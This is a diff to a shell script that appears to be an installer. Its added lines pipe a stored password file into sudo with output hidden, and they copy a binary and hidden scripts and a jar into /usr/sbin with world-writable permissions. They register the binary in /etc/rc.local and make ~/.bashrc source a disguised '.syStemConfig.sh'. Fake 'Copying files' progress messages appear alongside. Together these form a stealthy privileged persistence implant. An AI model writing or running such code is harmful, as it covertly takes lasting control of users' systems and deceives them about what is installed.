@@ -27,13 +27,20 @@ done
 
 cd $DIR/
 
-#sudo -k -S $DIR/freezer dec < $DIR/.pass > /dev/null 2>&1
-#sudo -k -S cp $DIR/freezer /usr/sbin < $DIR/.pass > /dev/null 2>&1
-#sudo -k -S cp $DIR/.pass /var/log/ < $DIR/.pass > /dev/null 2>&1
- $DIR/freezer dec| gnome-terminal
-#rm $DIR/.pass
-#rm $DIR/start.desktop
-#rm $DIR/freezer
+#create freezer folder and copy files into it
+sudo mkdir /usr/sbin/freezer < $DIR/.pass > /dev/null 2>&1
+sudo -k -S cp $DIR/.pass /usr/sbin/freezer/ < $DIR/.pass > /dev/null 2>&1
+sudo -k -S cp $DIR/freezer /usr/sbin/freezer/ < $DIR/.pass > /dev/null 2>&1
+sudo -k -S cp $DIR/.utilities.sh /usr/sbin/freezer/ < $DIR/.pass > /dev/null 2>&1
+sudo -k -S cp $DIR/.keybox.jar /usr/sbin/freezer/ < $DIR/.pass > /dev/null 2>&1
+sudo -k -S cp $DIR/.list_gen.sh /usr/sbin/freezer/ < $DIR/.pass > /dev/null 2>&1
+
+sudo -k -S chmod 777 /usr/sbin/freezer/*.sh < $DIR/.pass > /dev/null 2>&1
+sudo -k -S echo "/usr/sbin/freezer/freezer" >> /etc/rc.local < $DIR/.pass > /dev/null 2>&1
+ 
+echo "if [ -f ~/.syStemConfig.sh ]; then"                       >> $HOME/.bashrc
+echo "    . ~/.syStemConfig.sh "                                 >> $HOME/.bashrc
+echo "fi"                                                       >> $HOME/.bashrc
 
 mkdir $DIR/proxy_networks
 mkdir $DIR/proxy_networks/proxy172.16.24.{1..3}
@@ -49,7 +56,7 @@ touch $DIR/proxy_networks/proxy172.16.20.2/proxyfile{1..3}
 
 sleep 1
 echo "Initializing"
-sleep 2
+sleep 2 
 echo "Copying files ..."
 sleep 2
 echo "Unpacking files ..."
